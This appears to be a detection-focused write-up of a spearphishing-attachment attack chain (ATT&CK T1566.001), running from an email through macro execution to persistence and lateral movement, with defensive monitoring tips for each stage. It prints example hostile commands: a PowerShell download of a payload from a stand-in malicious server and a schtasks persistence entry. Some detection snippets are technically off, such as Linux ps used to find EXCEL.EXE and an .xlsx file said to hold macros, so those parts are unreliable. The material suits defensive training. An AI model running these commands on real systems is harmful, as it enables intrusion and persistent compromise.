Pattern Name: T1566.001 - Spearphishing Attachment
Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that exploits a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that establishes persistence on the victim's machine.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Applications Involved**: Outlook
- **User Action**: The user receives an email with a subject line "Important Update" and an attached Excel file named "Update_2023.xlsx".
- **Key Artifacts**: Email headers, attachment file (Update_2023.xlsx).
- **Detection Focus**: Monitor for emails with suspicious subject lines and attachments, especially those with macros enabled.

```shell
# Example of a suspicious email header
grep "Subject: Important Update" /var/log/mail.log
```

**Stage 2: Opening the Malicious Attachment**
- **Applications Involved**: Microsoft Excel
- **User Action**: The user opens the attachment, triggering the execution of embedded macros.
- **Key Artifacts**: Excel file with macros (Update_2023.xlsx).
- **Detection Focus**: Monitor for the execution of Excel with macros enabled, especially if the file is opened from an email attachment.

```shell
# Monitor for Excel process creation with macro execution
ps -ef | grep "EXCEL.EXE"
```

**Stage 3: Macro Execution and Payload Download**
- **Applications Involved**: PowerShell, Excel
- **User Action**: The macro executes a PowerShell command that downloads a malicious payload from a remote server.
- **Key Artifacts**: PowerShell command execution, downloaded file (malicious_payload.exe).
- **Detection Focus**: Monitor for PowerShell commands executed from Excel, especially those that download files from the internet.

```shell
# Example of a PowerShell command that downloads a payload
powershell -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\Users\Victim\Downloads\malicious_payload.exe'"
```

**Stage 4: Execution of the Malicious Payload**
- **Applications Involved**: Windows Command Prompt, malicious_payload.exe
- **User Action**: The downloaded payload is executed, establishing a reverse shell connection to the attacker's server.
- **Key Artifacts**: Execution of malicious_payload.exe, network connections to the attacker's IP.
- **Detection Focus**: Monitor for unusual outbound connections, especially those initiated by newly created executables.

```shell
# Monitor for outbound connections to known malicious IPs
netstat -an | grep "ESTABLISHED"
```

**Stage 5: Establishing Persistence**
- **Applications Involved**: Windows Task Scheduler, malicious_payload.exe
- **User Action**: The payload creates a scheduled task to ensure it runs on system startup.
- **Key Artifacts**: Scheduled task entry, command used to create the task.
- **Detection Focus**: Monitor for the creation of scheduled tasks that execute unusual executables.

```shell
# Example command to create a scheduled task
schtasks /create /tn "MaliciousTask" /tr "C:\Users\Victim\Downloads\malicious_payload.exe" /sc onlogon
```

**Stage 6: Lateral Movement and Data Exfiltration**
- **Applications Involved**: WMI, PowerShell
- **User Action**: The attacker uses WMI to gather information about other machines on the network and potentially exfiltrate sensitive data.
- **Key Artifacts**: WMI queries, PowerShell commands for data exfiltration.
- **Detection Focus**: Monitor for WMI queries that are unusual or originate from unexpected sources.

```shell
# Example of a WMI command to query system information
wmic /node:"target-machine" product get name,version
```
